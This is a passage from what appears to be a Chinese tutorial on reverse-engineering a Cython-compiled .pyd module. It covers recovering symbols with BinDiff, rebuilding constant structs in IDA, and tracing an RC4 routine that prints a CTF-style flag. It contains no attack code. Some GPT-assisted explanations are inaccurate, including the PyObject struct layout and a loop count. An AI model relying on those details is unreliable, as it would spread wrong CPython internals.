flag = &#x27;&#x27;    j = 0    c = x    s = list(range(256))    for i in range(256):        j = ((j + s[i]) + ord(key[i % len(key)])) % 256        s[i], s[j] = s[j], s[i]    j = 0    i = 0    for r in c:        i = (i + 1) % 256        j = (j + s[i]) % 256        s[i], s[j] = s[j], s[i]        x = (s[i] + s[j] % 256) % 256        flag += chr(r ^ s[x] % 256)    print(flag)\n\nimp.py\nimport sourcesource.sayhello()source.aadd(10,10)source.rc4()# hello world# 20# flag&#123;yes!_this_is_cython&#125;\n\n恢复符号用help函数可以看到模块的一些信息\nimport sourcehelp(source)&quot;&quot;&quot;返回结果Help on module source:NAME  #模块名    sourceFUNCTIONS #包含的函数    aadd(n, m)    rc4()    sayhello()DATA    __test__ = &#123;&#125;FILE #源文件    e:\\python projects\\cython\\source.cp313-win_amd64.pyd&quot;&quot;&quot;\n\n我们把得到的pyd文件拖入ida分析。如果是.so文件函数的符号是被去掉了，我们可以在linux下随便编译一个python版本相同且内容最好要相似的cython文件，用bindiff来恢复符号表。（python版本在ida的Imports窗口可以看到”我这里是python313，即为3.13”）\n根据上面的信息我们用linux编译一个差不多的cython模块。这里我用linux的pycharm部署了python3.13的cython环境。\nsudo apt install python3.13sudo apt-get install python3.13-dev \n\nsource.pyx\ndef sayhello():    return 1def aadd(n, m):    return 1def rc4():    return 1\n\nmycython.py同上\n在目录下用cython编译”.&#x2F;.venv&#x2F;bin&#x2F;python3.13 myc.py build_ext –inplace”\n\n把so文件复制出来，用ida打开一次获得idb数据库，bindiff导入恢复符号。\n这里有一个细节，就是windows下的cython文件默认是会去掉符号的，而linux却不会。所以如果是.pyd文件的话，我们要用下面的脚本进行编译来保留符号。\nmycthon.py\nfrom setuptools import setup,Extensionfrom Cython.Build import cythonize module = Extension(    &quot;MyPyd&quot;,    sources=[&quot;MyPyd.py&quot;],    extra_compile_args=[&quot;/Zi&quot;],  # 生成调试信息    extra_link_args=[&quot;/DEBUG&quot;],  # 生成 PDB 文件)setup(    ext_modules = cythonize(module,annotate=True))\n\nsource.pyx同上面linux的\n编译后会生成.pyd文件和.pdb（在build文件夹里面），用ida打开.pyd就可以导入.pdb文件，再用源文件与ida生成的.idb文件用bindiff插件即可恢复符号（ctrl+6）。\n重建结构体_Pyx_CreateStringTabAndInitStrings()保存了要使用的字符串常量，用于加载字符串。\n_ Pyx_InitConstants()保存了要使用的数字常量。\n为了更容易阅读代码中对常量的引用我们要重建一下结构体。\n我们先在off_18000B6A8按”Y“把类型设置为”__int64*”\n\n我们先定义一个结构体，结构体的大小最好大于等于n(off_18000B6A8 + n)，我这里是27，我们就创建一个有27个__int64元素的结构体。\n\n//一个结构体模板_Pyx_CreateStringTabAndInitStrings()typedef struct __strings &#123;    __int64* str_0;    __int64* str_1;    __int64* str_2;    __int64* str_3;    __int64* str_4;    __int64* str_5;    __int64* str_6;    __int64* str_7;    __int64* str_8;    __int64* str_9;    __int64* str_10;    __int64* str_11;    __int64* str_12;    __int64* str_13;    __int64* str_14;    __int64* str_15;    __int64* str_16;    __int64* str_17;    __int64* str_18;    __int64* str_19;    __int64* str_20;    __int64* str_21;    __int64* str_22;    __int64* str_23;    __int64* str_24;    __int64* str_25;    __int64* str_26;    __int64* str_27;    __int64* str_28;    __int64* str_29;    __int64* str_30;    __int64* str_31;    __int64* str_32;    __int64* str_33;    __int64* str_34;    __int64* str_35;    __int64* str_36;    __int64* str_37;    __int64* str_38;    __int64* str_39;    __int64* str_40;    __int64* str_41;    __int64* str_42;    __int64* str_43;    __int64* str_44;    __int64* str_45;    __int64* str_46;    __int64* str_47;    __int64* str_48;    __int64* str_49;    __int64* str_50;    __int64* str_51;    __int64* str_52;    __int64* str_53;    __int64* str_54;    __int64* str_55;    __int64* str_56;    __int64* str_57;    __int64* str_58;    __int64* str_59;    __int64* str_60;    __int64* str_61;    __int64* str_62;    __int64* str_63;&#125; str;\n\n//一个结构体模板__Pyx_InitConstants()typedef struct _iint &#123;    __int64* int_0;    __int64* int_1;    __int64* int_2;    __int64* int_3;    __int64* int_4;    __int64* int_5;    __int64* int_6;    __int64* int_7;    __int64* int_8;    __int64* int_9;    __int64* int_10;    __int64* int_11;    __int64* int_12;    __int64* int_13;    __int64* int_14;    __int64* int_15;    __int64* int_16;    __int64* int_17;    __int64* int_18;    __int64* int_19;    __int64* int_20;    __int64* int_21;    __int64* int_22;    __int64* int_23;    __int64* int_24;    __int64* int_25;    __int64* int_26;    __int64* int_27;    __int64* int_28;    __int64* int_29;    __int64* int_30;    __int64* int_31;    __int64* int_32;    __int64* int_33;    __int64* int_34;    __int64* int_35;    __int64* int_36;    __int64* int_37;    __int64* int_38;    __int64* int_39;    __int64* int_40;    __int64* int_41;    __int64* int_42;    __int64* int_43;    __int64* int_44;    __int64* int_45;    __int64* int_46;    __int64* int_47;    __int64* int_48;    __int64* int_49;    __int64* int_50;    __int64* int_51;    __int64* int_52;    __int64* int_53;    __int64* int_54;    __int64* int_55;    __int64* int_56;    __int64* int_57;    __int64* int_58;    __int64* int_59;    __int64* int_60;    __int64* int_61;    __int64* int_62;    __int64* int_63;&#125; iint;\n_Pyx_InitConstants()中数字常量结构体创建的脚本，看情况修改xxxxxxxxx处的值\nimport re# 输入_Pyx_InitConstants()的内容content = &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;def modify_struct(content):    # 创建一个字典映射 PyLong_FromLong 的值到结构体成员名称    mapping = &#123;&#125;    pattern = re.compile(r&#x27;PyLong_FromLong\\((\\d+)LL\\);&#x27;)    # 查找 content 中所有 PyLong_FromLong 的值    for match,i in zip(re.finditer(pattern, content),range(64)):  #range()内表示数据的最大数量XXXXXXXX        num = int(match.group(1))        mapping[num] = i + 37  # 假设从 37 开始，结构体开始的位置XXXXXXX    # 替换结构体定义中的成员名    for num, idx in mapping.items():        # 计算成员名        old_member = f&#x27;int_&#123;idx&#125;&#x27;        new_member = f&#x27;__int64* int_&#123;num&#125;&#x27;        print(new_member)modify_struct(content)\n\n先修改字符串的。按偏移量把元素名字修改成好阅读的\ntypedef struct __strings &#123;    __int64* str_0;    __int64* str_1;    __int64* str_2;    __int64* str_3;    __int64* str_4;    __int64* str_5;    __int64* str_6;    __int64* str_7;    __int64* str_wenhao;    __int64* str_unk_180009078;    __int64* str_aadd;    __int64* str_asyncio_coroutines;    __int64* str_unk_1800090B0;    __int64* str_chr;    __int64* str___class_getitem__;    __int64* str_cline_in_traceback;    __int64* str_flag;    __int64* str_hellow_orld;    __int64* str_i;    __int64* str__is_coroutine;    __int64* str_j;    __int64* str_key;    __int64* str_keykey;    __int64* str_m;    __int64* str___main__;    __int64* str_n;    __int64* str___name__;    __int64* str_print;    __int64* str_r;    __int64* str_range;    __int64* str_rc4;    __int64* str_s;    __int64* str_sayhello;    __int64* str_source;    __int64* str_sourcedpyx;    __int64* str___test__;    __int64* str_x;&#125; str;\n\n同样再重建一下_Pyx_InitConstants()内的结构体，数字常量的开头索引就是37，我们就截取从37开始的结构体，用脚本进行重命名，中间要是有不连续的索引记得看情况补上一个成员。\ntypedef struct _iint &#123;    __int64* int_37;    __int64* int_38;    __int64* int_39;    __int64* int_40;    __int64* int_41;    __int64* int_42;    __int64* int_43;    __int64* int_44;    __int64* int_45;    __int64* int_46;    __int64* int_47;    __int64* int_48;    __int64* int_49;    __int64* int_50;    __int64* int_51;    __int64* int_52;    __int64* int_53;    __int64* int_54;    __int64* int_55;    __int64* int_56;    __int64* int_57;    __int64* int_58;    __int64* int_59;    __int64* int_60;    __int64* int_61;    __int64* int_62;    __int64* int_63;&#125; iint;\n\nimport recontent = &#x27;&#x27;&#x27;v0 = PyLong_FromLong(0LL);  *((_QWORD *)_pyx + 37) = v0;  if ( !v0 )    return 0xFFFFFFFFLL;  v1 = PyLong_FromLong(1LL);  *((_QWORD *)_pyx + 38) = v1;  if ( !v1 )    return 0xFFFFFFFFLL;  v2 = PyLong_FromLong(5LL);  *((_QWORD *)_pyx + 39) = v2;  if ( !v2 )    return 0xFFFFFFFFLL;  v3 = PyLong_FromLong(23LL);  *((_QWORD *)_pyx + 40) = v3;  if ( !v3 )    return 0xFFFFFFFFLL;  v4 = PyLong_FromLong(28LL);  *((_QWORD *)_pyx + 41) = v4;  if ( !v4 )    return 0xFFFFFFFFLL;  v5 = PyLong_FromLong(56LL);  *((_QWORD *)_pyx + 42) = v5;  if ( !v5 )    return 0xFFFFFFFFLL;  v6 = PyLong_FromLong(68LL);  *((_QWORD *)_pyx + 43) = v6;  if ( !v6 )    return 0xFFFFFFFFLL;  v7 = PyLong_FromLong(77LL);  *((_QWORD *)_pyx + 44) = v7;  if ( !v7 )    return 0xFFFFFFFFLL;  v8 = PyLong_FromLong(98LL);  *((_QWORD *)_pyx + 45) = v8;  if ( !v8 )    return 0xFFFFFFFFLL;  v9 = PyLong_FromLong(99LL);  *((_QWORD *)_pyx + 46) = v9;  if ( !v9 )    return 0xFFFFFFFFLL;  v10 = PyLong_FromLong(107LL);  *((_QWORD *)_pyx + 47) = v10;  if ( !v10 )    return 0xFFFFFFFFLL;  v11 = PyLong_FromLong(108LL);  *((_QWORD *)_pyx + 48) = v11;  if ( !v11 )    return 0xFFFFFFFFLL;  v12 = PyLong_FromLong(125LL);  *((_QWORD *)_pyx + 49) = v12;  if ( !v12 )    return 0xFFFFFFFFLL;  v13 = PyLong_FromLong(134LL);  *((_QWORD *)_pyx + 50) = v13;  if ( !v13 )    return 0xFFFFFFFFLL;  v14 = PyLong_FromLong(144LL);  *((_QWORD *)_pyx + 51) = v14;  if ( !v14 )    return 0xFFFFFFFFLL;  v15 = PyLong_FromLong(147LL);  *((_QWORD *)_pyx + 52) = v15;  if ( !v15 )    return 0xFFFFFFFFLL;  v16 = PyLong_FromLong(150LL);  *((_QWORD *)_pyx + 53) = v16;  if ( !v16 )    return 0xFFFFFFFFLL;  v17 = PyLong_FromLong(154LL);  *((_QWORD *)_pyx + 54) = v17;  if ( !v17 )    return 0xFFFFFFFFLL;  v18 = PyLong_FromLong(204LL);  *((_QWORD *)_pyx + 55) = v18;  if ( !v18 )    return 0xFFFFFFFFLL;  v19 = PyLong_FromLong(211LL);  *((_QWORD *)_pyx + 56) = v19;  if ( !v19 )    return 0xFFFFFFFFLL;  v20 = PyLong_FromLong(214LL);  *((_QWORD *)_pyx + 57) = v20;  if ( !v20 )    return 0xFFFFFFFFLL;  v21 = PyLong_FromLong(216LL);  *((_QWORD *)_pyx + 58) = v21;  if ( !v21 )    return 0xFFFFFFFFLL;  v22 = PyLong_FromLong(226LL);  *((_QWORD *)_pyx + 59) = v22;  if ( !v22 )    return 0xFFFFFFFFLL;  v23 = PyLong_FromLong(235LL);  *((_QWORD *)_pyx + 60) = v23;  if ( !v23 )    return 0xFFFFFFFFLL;  v24 = PyLong_FromLong(238LL);  *((_QWORD *)_pyx + 61) = v24;  if ( !v24 )    return 0xFFFFFFFFLL;  v25 = PyLong_FromLong(241LL);  *((_QWORD *)_pyx + 62) = v25;  if ( !v25 )    return 0xFFFFFFFFLL;  v26 = PyLong_FromLong(256LL);  *((_QWORD *)_pyx + 63) = v26;&#x27;&#x27;&#x27;def modify_struct(content):    # 创建一个字典映射 PyLong_FromLong 的值到结构体成员名称    mapping = &#123;&#125;    pattern = re.compile(r&#x27;PyLong_FromLong\\((\\d+)LL\\);&#x27;)    # 查找 content 中所有 PyLong_FromLong 的值    for match,i in zip(re.finditer(pattern, content),range(64)):  #range()内表示数据的最大数量XXXXXXXX        num = int(match.group(1))        mapping[num] = i + 37  # 假设从 37 开始，结构体开始的位置XXXXXXX    # 替换结构体定义中的成员名    for num, idx in mapping.items():        # 计算成员名        old_member = f&#x27;int_&#123;idx&#125;&#x27;        new_member = f&#x27;__int64* int_&#123;num&#125;&#x27;        print(new_member)modify_struct(content)\n\ntypedef struct _iint &#123;    __int64* int_0;    __int64* int_1;    __int64* int_5;    __int64* int_23;    __int64* int_28;    __int64* int_56;    __int64* int_68;    __int64* int_77;    __int64* int_98;    __int64* int_99;    __int64* int_107;    __int64* int_108;    __int64* int_125;    __int64* int_134;    __int64* int_144;    __int64* int_147;    __int64* int_150;    __int64* int_154;    __int64* int_204;    __int64* int_211;    __int64* int_214;    __int64* int_216;    __int64* int_226;    __int64* int_235;    __int64* int_238;    __int64* int_241;    __int64* int_256;&#125; iint;\n\n如果_Pyx_CreateStringTabAndInitStrings()和_ Pyx_InitConstants()使用的是相同的基地址(都是off_18000B6A8)，我们把两个结构体合并，两个结构体之间连接的索引要连续。如果不相同，就分别修复结构体就行。\ntypedef struct data &#123;    __int64* str_0;    __int64* str_1;    __int64* str_2;    __int64* str_3;    __int64* str_4;    __int64* str_5;    __int64* str_6;    __int64* str_7;    __int64* str_wenhao;    __int64* str_unk_180009078;    __int64* str_aadd;    __int64* str_asyncio_coroutines;    __int64* str_unk_1800090B0;    __int64* str_chr;    __int64* str___class_getitem__;    __int64* str_cline_in_traceback;    __int64* str_flag;    __int64* str_hellow_orld;    __int64* str_i;    __int64* str__is_coroutine;    __int64* str_j;    __int64* str_key;    __int64* str_keykey;    __int64* str_m;    __int64* str___main__;    __int64* str_n;    __int64* str___name__;    __int64* str_print;    __int64* str_r;    __int64* str_range;    __int64* str_rc4;    __int64* str_s;    __int64* str_sayhello;    __int64* str_source;    __int64* str_sourcedpyx;    __int64* str___test__;    __int64* str_x;    __int64* int_0;    __int64* int_1;    __int64* int_5;    __int64* int_23;    __int64* int_28;    __int64* int_56;    __int64* int_68;    __int64* int_77;    __int64* int_98;    __int64* int_99;    __int64* int_107;    __int64* int_108;    __int64* int_125;    __int64* int_134;    __int64* int_144;    __int64* int_147;    __int64* int_150;    __int64* int_154;    __int64* int_204;    __int64* int_211;    __int64* int_214;    __int64* int_216;    __int64* int_226;    __int64* int_235;    __int64* int_238;    __int64* int_241;    __int64* int_256;&#125; data;\n\n在local type窗口添加这个结构体。再按Y把off_18000B6A8的类型改为结构体的名字(这里是data)，再按n把off_18000B6A8重命名一下。\n\n\n记得检查一下结果是否对应正确。                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n逆向分析不认识的函数可以查抽象对象层\n_Pyx_AddTraceback()用于记录调用栈信息，会写入当前函数在模块中的名字，一般为”模块名.函数名”，这使得我们可以在字符串表中找到我们需要逆向的函数。\n首先我们分析一下source.sayhello\n\n①处的处理逻辑(gpt辅助)\n在 Cython 编译成 C 代码后，Python 对象在底层是通过 PyObject 结构体来表示的，而这个结构体包含了对象的多种信息，其中就包括引用计数。\ntypedef struct &#123;    PyObject_VAR_HEAD    PyObject *ob_type;  // 类型信息    Py_ssize_t ob_refcnt;  // 引用计数器&#125; PyObject;\n\n\n异常捕捉： 第一部分的 if (v3) 检查了一个条件，可能是一个对象指针。接下来的代码是尝试进行某种资源的释放或对象的内存管理：\n\n检查 *v3 &gt;= 0，这可能是在检查指针指向的对象的状态。\nv5 = (*(_QWORD *)v3)-- == 1LL; v3 强制类型转换为指向 64 位整型的指针，直接访问 v3 指向的 PyObject 结构体中的 ob_refcnt 字段，检查对象引用计数是否为 1，并且在引用计数为 1 时调用 Py_Dealloc 来释放对象。\nv4 = Py_NoneStruct; 和 if (Py_NoneStruct != -1) ++Py_NoneStruct; 这部分可能是与 None 对象的引用计数有关，Py_NoneStruct 是一个指向 Python None 的结构体指针。\n\n\n异常回溯： 如果 v3 为 NULL 或者其他异常情况，代码会调用 _Pyx_AddTraceback 记录调用栈信息：\n_Pyx_AddTraceback(&quot;source.sayhello&quot;, 2562LL, 3LL, &quot;source.pyx&quot;); //函数，行号，栈帧的深度，原文件名称\n\n这表示在 source.pyx 文件的某个地方发生了问题。\n\n\nsource.aadd\n// write access to const memory has been detected, the output may be wrong!__int64 __fastcall _pyx_pw_6source_3aadd(__int64 a1, __int64 *a2, __int64 a3, __int64 a4)&#123;......  *(_QWORD *)&amp;input = _Pyx_GetKwValue_FASTCALL(a4, v5, _pyx-&gt;str_n);// 以字典获取关键字参数，a4是指向字典（kwargs）的指针,v5是存储返回结果的变量，n是参数名，结果返回到input[0]  input_b = input;  if ( !(_QWORD)input )  &#123;    if ( PyErr_Occurred() )    &#123;      v11 = 2684LL;      goto LABEL_26;    &#125;    goto LABEL_25;  &#125;  v7 = _pyx;  --v10;LABEL_13:  *((_QWORD *)&amp;input + 1) = _Pyx_GetKwValue_FASTCALL(a4, v5, v7-&gt;str_m);// 同上，返回参数m的值到input[1]中  if ( !*((_QWORD *)&amp;input + 1) )               // 一些异常处理  &#123;    if ( PyErr_Occurred() )    &#123;      v11 = 2692LL;    &#125;    else    &#123;      _Pyx_RaiseArgtupleInvalid(v13, v12, v14, v15, 1LL);// 检查函数参数个数      v11 = 2694LL;    &#125;    goto LABEL_26;  &#125;  --v10;LABEL_15:  if ( v10 &gt; 0 )  &#123;    if ( (int)_Pyx_ParseOptionalKeywords(a4, (_DWORD)v5, (unsigned int)v26, a4, (__int64)&amp;input, a3) &lt; 0 )// 处理函数调用中的可选关键字参数把值解析到对应的函数参数中    &#123;      v11 = 2699LL;LABEL_26:      _Pyx_AddTraceback(&quot;source.aadd&quot;, v11, 8LL, &quot;source.pyx&quot;);      return 0LL;    &#125;    input_b = input;                            // 赋值  &#125;LABEL_28:  input0 = _Pyx_PyInt_As_int(input_b);          // 从python对象里提出一个值转为c的int类型  if ( input0 == -1 &amp;&amp; PyErr_Occurred() )  &#123;    v18 = 2759LL;  &#125;  else  &#123;    input1 = _Pyx_PyInt_As_int(*((_QWORD *)&amp;input + 1));    if ( input1 == -1 &amp;&amp; PyErr_Occurred() )    &#123;      v18 = 2760LL;    &#125;    else    &#123;      input_add = input0 + input1;              // m + n       if ( input_add == -1 &amp;&amp; PyErr_Occurred() )      &#123;        v18 = 2761LL;      &#125;      else      &#123;        input_add_pyint = PyLong_FromLong(input_add);// 结果转为python的数字对象        v22 = (int *)input_add_pyint;        if ( input_add_pyint )        &#123;          v23 = (int *)_Pyx_PyObject_CallOneArg(return, input_add_pyint);// 调用函数return返回相加结果        ......\n\nsource.rc4\n// write access to const memory has been detected, the output may be wrong!__int64 _pyx_pf_6source_4rc4()&#123; ......  s2 = 0LL;  sj_y256 = 0LL;  v2 = 0LL;  count3 = 0LL;  v4 = 25;  key_index = 0LL;  v80 = 0LL;  key = 0LL;  m1 = 0LL;  sbox2 = 0LL;  i2 = 0LL;  m5 = 0LL;  m = PyList_New(25LL);                         // 创建了一个大小为25的列表  if ( !m )  &#123;    v4 = 12;    v7 = 2845;    goto LABEL_290;  &#125;  v8 = _pyx;                                    // 赋值  int_28 = _pyx-&gt;int_28;   //把密文加载到列表m中  if ( *(_DWORD *)int_28 != -1 )    ++*(_DWORD *)int_28;  **(_QWORD **)(m + 24) = v8-&gt;int_28;......  if ( *(_DWORD *)int_56 != -1 )    ++*(_DWORD *)int_56;  v80 = (int *)m;  *(_QWORD *)(*(_QWORD *)(m + 24) + 192LL) = v8-&gt;int_56;// 上面都是在给列表赋值，值就是一些数字常量，这是密文  str_keykey = v8-&gt;str_keykey;  if ( *(_DWORD *)str_keykey != -1 )    ++*(_DWORD *)str_keykey;  str_7 = v8-&gt;str_7;  key = v8-&gt;str_keykey;                         // 加载密钥  if ( *(_DWORD *)str_7 != -1 )    ++*(_DWORD *)str_7;  int_0 = v8-&gt;int_0;  flag = v8-&gt;str_7;  if ( *(_DWORD *)int_0 != -1 )    ++*(_DWORD *)int_0;  j = (int *)v8-&gt;int_0;  v83 = j;  if ( *(_DWORD *)m != -1 )    ++*(_DWORD *)m;  m1 = (int *)m;  s = _Pyx_PyObject_Call(qword_18000BF48, v8[1].str_0);// 调用一个对象，参数分别是调用对象名和参数,猜测返回值是256的那个表  if ( !s )  &#123;    v4 = 17;    v7 = 2972;    goto LABEL_289;  &#125;  if ( *(_QWORD *)(s + 8) == PyList_Type &amp;&amp; *(_QWORD *)s == 1LL )// 判断返回值是否是列表，引用计数是否为1  &#123;    *(_DWORD *)s = 2;    s2 = s;                                     // 把列表赋值给v0  &#125;  else  &#123;    s2 = PySequence_List(s);                    // 把python对象转成列表，赋值给v0    if ( !s2 )    &#123;      v4 = 17;      v7 = 2974;LABEL_268:      if ( *(int *)s &gt;= 0 )                     // 判断是否释放对象      &#123;        v39 = (*(_QWORD *)s)-- == 1LL;        if ( v39 )          Py_Dealloc(s);      &#125;      if ( !s2 )      &#123;LABEL_277:        if ( key_index )          goto LABEL_278;        goto LABEL_281;      &#125;LABEL_274:      if ( *(int *)s2 &gt;= 0 )      &#123;        v39 = (*(_QWORD *)s2)-- == 1LL;        if ( v39 )          Py_Dealloc(s2);      &#125;      goto LABEL_277;    &#125;  &#125;  if ( *(int *)s &gt;= 0 )  &#123;    v39 = (*(_QWORD *)s)-- == 1LL;    if ( v39 )      Py_Dealloc(s);  &#125;  sbox1 = s2;                                   // 表  sbox2 = (int *)s2;                            // 表，暂时分不清类型是什么，感觉一个是地址，一个是元素  do  &#123;    count1 = PyLong_FromLong((unsigned int)count3);// v3的值是0，赋值给count1    i = (int *)count1;                          // 赋值count1给i，i由下面推出    if ( !count1 )    &#123;      v4 = 18;      v7 = 2988;      goto LABEL_287;    &#125;    v43 = i2;    i2 = (int *)count1;                         // 赋值count1到count2    if ( v43 )    &#123;      if ( *v43 &gt;= 0 )      &#123;        v39 = (*(_QWORD *)v43)-- == 1LL;        if ( v39 )          Py_Dealloc(v43);      &#125;    &#125;    Item = _Pyx_PyObject_GetItem(sbox1, i);     // 从盒中获取元素s[i]    s2 = Item;    if ( !Item )    &#123;      v4 = 19;      v7 = 3000;      goto LABEL_287;    &#125;    s = PyNumber_Add(j, Item);                  // j的初始值是0，这里实现了j+s[i]    if ( !s )    &#123;      v4 = 19;      v7 = 3002;      goto LABEL_274;    &#125;    if ( *(int *)s2 &gt;= 0 )    &#123;      v39 = (*(_QWORD *)s2)-- == 1LL;      if ( v39 )        Py_Dealloc(s2);    &#125;    s2 = 0LL;    if ( key[2] == -1 )                         // 这里使用了key，下面的操作可能有关于key    &#123;      v7 = 3005;      goto LABEL_267;    &#125;    keylen = PyLong_FromSsize_t();              // 由下面可以更确定i，同时得知这里在获取key的大小    s2 = keylen;    if ( !keylen )    &#123;      v7 = 3006;      goto LABEL_267;    &#125;    key_index = (int *)PyNumber_Remainder(i, keylen);// 取余，实现了i%keylen    if ( !key_index )    &#123;      v7 = 3008;      goto LABEL_267;    &#125;    if ( *(int *)s2 &gt;= 0 )    &#123;      v39 = (*(_QWORD *)s2)-- == 1LL;      if ( v39 )        Py_Dealloc(s2);    &#125;    s2 = _Pyx_PyObject_GetItem(key, key_index); // 按下标从key中取出元素，这里保存到了s2中    if ( !s2 )    &#123;      v7 = 3011;      goto LABEL_267;    &#125;    if ( *key_index &gt;= 0 )    &#123;      v39 = (*(_QWORD *)key_index)-- == 1LL;      if ( v39 )        Py_Dealloc(key_index);    &#125;    v46 = *(_QWORD *)(s2 + 8);    key_index = 0LL;    v47 = *(_DWORD *)(v46 + 168);    if ( (v47 &amp; 0x10000000) != 0 )    &#123;      intkey = _Pyx_PyUnicode_AsPy_UCS4(s2);    // 这里把s2按ascii码转为数字      goto LABEL_104;    &#125;    if ( (v47 &amp; 0x8000000) != 0 )    &#123;      v49 = *(_QWORD *)(s2 + 16);      if ( v49 == 1 )      &#123;        intkey = *(unsigned __int8 *)(s2 + 32);        goto LABEL_104;      &#125;LABEL_102:      v50 = &quot;ord() expected a character, but string of length %zd found&quot;;// 熟悉的ord()函数，证实了上面的操作      goto LABEL_103;    &#125;    if ( v46 == PyByteArray_Type || (unsigned int)PyType_IsSubtype() )    &#123;      v49 = *(_QWORD *)(s2 + 16);      if ( v49 == 1 )      &#123;        intkey = **(unsigned __int8 **)(s2 + 40);        goto LABEL_104;      &#125;      goto LABEL_102;    &#125;    v50 = &quot;ord() expected string of length 1, but %.200s found&quot;;    v49 = *(_QWORD *)(*(_QWORD *)(s2 + 8) + 24LL);LABEL_103:    PyErr_Format(PyExc_TypeError, v50, v49);    intkey = -1;LABEL_104:    if ( intkey == -1 )    &#123;      v7 = 3014;      goto LABEL_267;    &#125;    if ( *(int *)s2 &gt;= 0 )    &#123;      v39 = (*(_QWORD *)s2)-- == 1LL;      if ( v39 )        Py_Dealloc(s2);    &#125;    intkey1 = PyLong_FromLong(intkey);          // 把获取的ascii数转为转为python对象    s2 = intkey1;                               // 赋值给s2    if ( !intkey1 )    &#123;      v7 = 3016;      goto LABEL_267;    &#125;    key_index = (int *)PyNumber_Add(s, intkey1);// 加法运算，s是上面的j+s[i],这里实现了操作(j + s[i]) + ord(key[i % len(key)])    if ( !key_index )    &#123;      v7 = 3018;LABEL_267:      v4 = 19;      goto LABEL_268;    &#125;    if ( *(int *)s &gt;= 0 )    &#123;      v39 = (*(_QWORD *)s)-- == 1LL;      if ( v39 )        Py_Dealloc(s);    &#125;    if ( *(int *)s2 &gt;= 0 )    &#123;      v39 = (*(_QWORD *)s2)-- == 1LL;      if ( v39 )        Py_Dealloc(s2);    &#125;    result = _Pyx_PyInt_RemainderObjC(key_index, _pyx-&gt;int_256);// 把加来的结果对256取余    if ( !result )    &#123;      v4 = 19;      v7 = 3022;      goto LABEL_278;    &#125;    if ( *key_index &gt;= 0 )    &#123;      v39 = (*(_QWORD *)key_index)-- == 1LL;      if ( v39 )        Py_Dealloc(key_index);    &#125;    v53 = v83;    j = (int *)result;                          // 赋值给j，这里一起实现了j = ((j + s[i]) + ord(key[i % len(key)])) % 256    v54 = (int *)v83;    v83 = (_QWORD *)result;    if ( *v54 &gt;= 0 )    &#123;      v39 = (*v53)-- == 1LL;      if ( v39 )        Py_Dealloc(v54);    &#125;    sbox1 = (__int64)sbox2;    s2 = _Pyx_PyObject_GetItem(sbox2, result);  // 获取s[result]    if ( !s2 )    &#123;      v4 = 20;      v7 = 3035;      count3 = sbox2;      goto LABEL_288;    &#125;    key_index = (int *)_Pyx_PyObject_GetItem(sbox2, i);// 获取s[i]    if ( !key_index )    &#123;      v4 = 20;      v7 = 3037;      goto LABEL_274;    &#125;    if ( (int)PyObject_SetItem(sbox2, i, s2) &lt; 0 )// s[i] = s2    &#123;      v4 = 20;      v7 = 3039;      goto LABEL_274;    &#125;    if ( *(int *)s2 &gt;= 0 )    &#123;      v39 = (*(_QWORD *)s2)-- == 1LL;      if ( v39 )        Py_Dealloc(s2);    &#125;    if ( (int)PyObject_SetItem(sbox2, j, key_index) &lt; 0 )// s[j] = key_index,这里实现了s[i]和s[j]的互换    &#123;      v4 = 20;      v7 = 3041;      goto LABEL_278;    &#125;    if ( *key_index &gt;= 0 )    &#123;      v39 = (*(_QWORD *)key_index)-- == 1LL;      if ( v39 )        Py_Dealloc(key_index);    &#125;    LODWORD(count3) = (_DWORD)count3 + 1;       // 循环计数加一    key_index = 0LL;  &#125;  while ( (int)count3 &lt; 256 );                  // 循环255次  v55 = _pyx;  v56 = _pyx-&gt;int_0;  if ( *(_DWORD *)v56 != -1 )    ++*(_DWORD *)v56;  v2 = v55-&gt;int_0;  v83 = v2;  if ( *j &gt;= 0 )  &#123;    v39 = (*(_QWORD *)j)-- == 1LL;    if ( v39 )      Py_Dealloc(j);  &#125;  v57 = _pyx;  v58 = _pyx-&gt;int_0;  if ( *(_DWORD *)v58 != -1 )    ++*(_DWORD *)v58;  iint0 = v57-&gt;int_0;  i2 = (int *)iint0;                            // 这里是i，初始化i=1,往下看可以推出  if ( *i &gt;= 0 )  &#123;    v39 = (*(_QWORD *)i)-- == 1LL;    if ( v39 )      Py_Dealloc(i);  &#125;  v60 = m1;  key_index = m1;  if ( *m1 != -1 )    ++*m1;  count3 = sbox2;  s2 = 0LL;  count4 = 0LL;  if ( *((__int64 *)m1 + 2) &lt;= 0 )  &#123;LABEL_226:    if ( *v60 &gt;= 0 )    &#123;      v39 = (*(_QWORD *)v60)-- == 1LL;      if ( v39 )        Py_Dealloc(v60);    &#125;    sj_y256 = (int *)flag;    v77 = (int *)_Pyx_PyObject_CallOneArg(callable, flag);    if ( !v77 )    &#123;      v4 = 29;      v7 = 3202;      goto LABEL_290;    &#125;    if ( *v77 &gt;= 0 )    &#123;      v39 = (*(_QWORD *)v77)-- == 1LL;      if ( v39 )        Py_Dealloc(v77);    &#125;    s2 = Py_NoneStruct;    if ( Py_NoneStruct != -1 )      ++Py_NoneStruct;  &#125;  else  &#123;    j2 = (int *)v2;                             // 由下面的判断这里是第二个循环的j,初始化j=0    m2 = m1;                                    // 密文    while ( 1 )    &#123;      m4 = *(int **)(*((_QWORD *)m2 + 3) + 8 * count4);// 截取了密文count4为密文索引，这里按顺序获取八位二进制密文      if ( *m4 != -1 )        ++*m4;      v65 = m5;      ++count4;                                 // 下一个密文的索引      m5 = m4;                                  // 赋值密文      if ( v65 )      &#123;        if ( *v65 &gt;= 0 )        &#123;          v39 = (*(_QWORD *)v65)-- == 1LL;          if ( v39 )            Py_Dealloc(v65);        &#125;      &#125;      i_add1 = _Pyx_PyInt_AddObjC(iint0, _pyx-&gt;int_1);// 这里的iint0在上面赋值给了i2，也就是i，在下面又会把i的值赋值给iint0，所以这个变量也是i,这里实现了i+1      s2 = i_add1;      if ( !i_add1 )        break;      iY256 = _Pyx_PyInt_RemainderObjC(i_add1, _pyx-&gt;int_256);// (i+1)%256      if ( !iY256 )      &#123;        sj_y256 = 0LL;        v4 = 24;        v7 = 3100;        goto LABEL_274;      &#125;      if ( *(int *)s2 &gt;= 0 )      &#123;        v39 = (*(_QWORD *)s2)-- == 1LL;        if ( v39 )          Py_Dealloc(s2);      &#125;      v68 = (int *)iint0;      i2 = (int *)iY256;                        // 可以确定s2是i,因为(i+1)%256杯赋值回了i      iY256_ = iY256;      if ( *v68 &gt;= 0 )      &#123;        v39 = 